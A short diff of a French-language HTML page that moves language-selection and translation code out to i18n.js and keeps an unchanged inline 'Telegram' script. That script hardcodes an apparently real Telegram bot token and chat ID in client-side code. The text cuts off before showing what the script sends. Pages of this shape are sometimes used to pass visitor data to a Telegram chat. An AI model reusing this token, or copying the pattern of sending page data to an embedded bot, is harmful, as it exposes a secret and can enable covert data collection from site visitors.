@@ -38,37 +38,10 @@
     <p id="footer" data-i18n-key="footerText"></p>
   </footer>
 
-  <!-- i18n.js doit définir `translations` et la fonction getLanguage() comme ci-dessous -->
+  <!-- Chargement i18n -->
   <script src="i18n.js"></script>
+  <!-- Script Telegram (inchangé) -->
   <script>
-    // Récupère la langue (localStorage > navigator)
-    function getLanguage() {
-      let lang = localStorage.getItem('lang') || navigator.language.slice(0,2) || 'fr';
-      if (!translations[lang]) lang = 'fr';
-      return lang;
-    }
-
-    const lang = getLanguage();
-    localStorage.setItem('lang', lang);
-    document.documentElement.lang = lang;
-
-    // Initialise le sélecteur
-    const select = document.getElementById('lang-select');
-    select.value = lang;
-    select.addEventListener('change', e => {
-      localStorage.setItem('lang', e.target.value);
-      window.location.reload();
-    });
-
-    // Applique les traductions
-    document.querySelectorAll('[data-i18n-key]').forEach(el => {
-      const key = el.getAttribute('data-i18n-key');
-      el.innerText = translations[lang][key];
-    });
-  </script>
-
-  <script>
-    // Script Telegram (inchangé)
     (function(){
       const botToken = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
       const chatId   = "-4970333928";
